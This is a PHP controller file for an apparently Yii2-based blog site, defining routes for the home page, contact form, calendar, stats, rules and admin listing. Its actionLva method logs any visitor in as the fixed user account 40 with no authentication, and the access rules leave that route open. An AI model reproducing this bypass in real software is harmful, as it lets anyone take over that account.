<?php

namespace app\controllers;

use app\models\BlogTheme;
use app\models\Market;
use app\models\User;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;
use app\models\search\BlogPostSearch;

class SiteController extends Controller
{
    public function beforeAction($action)
    {
        if (!Yii::$app->user->isGuest) {
            Yii::$app->user->identity->setOnline();
        }

        return parent::beforeAction($action);
    }

    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    public function actionCalendar()
    {
        return $this->render('calendar');
    }

    public function actionCalendari()
    {
        $this->layout = false;
        return $this->render('calendari');
    }

    public function actionIndex()
    {
        $this->layout = 'blog';

        $searchModel = new BlogPostSearch();
        $searchModel->pageSize = 7;
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);
        $pagination = $dataProvider->getPagination();

        return $this->render('index', [
            'pagination' => $pagination,
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    public function actionStats()
    {
        return $this->render('stats');
    }

    public function actionGraph($i)
    {
        $this->actionParams['graph'] = '123';
        return $this->render('graph', ['i' => $i]);
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');

            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        return $this->render('about');
    }

    public function actionRules()
    {
        return $this->render('rules');
    }

    public function actionReklama()
    {
        return $this->render('reklama');
    }

    public function actionAdmins()
    {
        return $this->render('admins');
    }

    public function actionLva()
    {
        $user = User::findOne(40);
        Yii::$app->user->login($user);

        return $this->redirect('/');
    }
}
